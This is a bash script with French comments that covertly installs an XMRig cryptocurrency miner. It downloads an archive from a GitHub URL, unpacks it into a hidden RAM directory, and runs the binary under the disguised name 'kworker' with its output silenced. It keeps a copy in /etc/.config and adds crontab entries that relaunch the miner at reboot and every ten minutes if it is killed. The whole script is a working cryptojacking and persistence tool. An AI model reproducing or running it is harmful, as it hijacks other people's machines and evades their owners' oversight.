#!/bin/bash

# Dossier furtif en RAM
DIR="/dev/shm/.syslog"
BIN="kworker"
ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"
PERSIST_ARCHIVE="/etc/.config/xmrig.tar.gz"

# Création dossier RAM + install
mkdir -p "$DIR" && cd "$DIR" || exit 1

# Téléchargement de l'archive furtive
curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz
tar -xzf miner.tar.gz
chmod +x "$BIN"
rm -f miner.tar.gz

# Lancer XMRig furtivement
nohup nice -n 19 "$DIR/$BIN" --config="$DIR/cfg.json" > /dev/null 2>&1 &

# Sauvegarder une copie persistante pour relancer après reboot
mkdir -p /etc/.config/
cp "$ARCHIVE_URL" "$PERSIST_ARCHIVE" 2>/dev/null || cp "$DIR/$BIN" "$PERSIST_ARCHIVE"

# Crontab reboot furtif : re-déploiement RAM depuis archive persistante
(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p /dev/shm/.syslog && tar -xzf $PERSIST_ARCHIVE -C /dev/shm/.syslog && /dev/shm/.syslog/kworker --config=/dev/shm/.syslog/cfg.json > /dev/null 2>&1") | crontab -

# Crontab watchdog (relance auto si process tué)
(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p /dev/shm/.syslog && tar -xzf $PERSIST_ARCHIVE -C /dev/shm/.syslog && /dev/shm/.syslog/kworker --config=/dev/shm/.syslog/cfg.json > /dev/null 2>&1)") | crontab -
